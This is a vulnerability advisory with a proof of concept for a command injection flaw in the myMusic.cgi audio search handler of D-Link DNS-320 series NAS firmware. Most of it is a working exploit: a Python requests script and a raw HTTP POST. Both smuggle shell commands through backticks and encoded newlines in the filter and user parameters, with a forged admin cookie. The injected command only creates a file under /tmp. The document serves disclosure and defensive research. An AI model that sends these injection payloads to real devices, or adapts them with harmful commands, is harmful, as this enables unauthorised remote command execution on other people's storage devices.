# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)

# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_audio_search function of the file /cgi-bin/myMusic.cgi.  The variable `filter`is passed from a POST request and is assigned to `v3` via the `snprintf` function at line 32 and invoked by the `popen` command,  it can lead to command execution.

![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723711343673-c563a4e2-ff64-4531-8db6-044126da183f.png#averageHue=%23fcf8f6&clientId=ua34e0002-2f95-4&from=paste&height=262&id=u3a8bd6c9&originHeight=262&originWidth=1150&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46252&status=done&style=none&taskId=u5c9e0180-9aec-4b8b-8b62-c2d00fe7941&title=&width=1150)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/myMusic.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_audio_search&filter=`touch%09/tmp/112`&type=1&user=photos&idx=10&user=%0atouch%09/tmp/112%0a&genre=10&date=19&r=/tmp/"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/myMusic.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_audio_search&filter=`touch%09/tmp/112`&type=1&user=photos&idx=10&user=%0atouch%09/tmp/112%0a&genre=10&date=19&r=/tmp/
```
